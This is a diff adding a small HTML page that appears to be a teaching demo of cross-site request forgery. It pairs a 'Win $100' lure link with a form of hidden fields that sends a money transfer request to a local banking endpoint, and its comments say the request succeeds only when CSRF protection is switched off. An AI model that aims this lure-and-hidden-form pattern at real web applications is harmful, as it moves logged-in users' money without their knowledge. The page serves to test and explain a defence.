@@ -1,0 +1,22 @@
+<html lang="zh">
+<head>
+    <title>CSRF test on Hack Domain</title>
+</head>
+<body>
+<h1>CSRF test on Hack Domain</h1>
+<!-- when enable csrf, you can transfer money in localhost:8080 after you are authenticated -->
+<!-- but you can't transfer money in localhost:8081 -->
+<a href="http://localhost:8080/transfer?accountNo=123&amount=100">Win $100</a>
+<form action="http://localhost:8080/transfer" method="post">
+    <lable>Account Number</lable>
+    <label>
+        <input hidden name="accountNo" type="text" value="123">
+    </label>
+    <lable>amount</lable>
+    <label>
+        <input hidden name="amount" type="text" value="100">
+    </label>
+    <input type="submit" value="Win $100">
+</form>
+</body>
+</html>
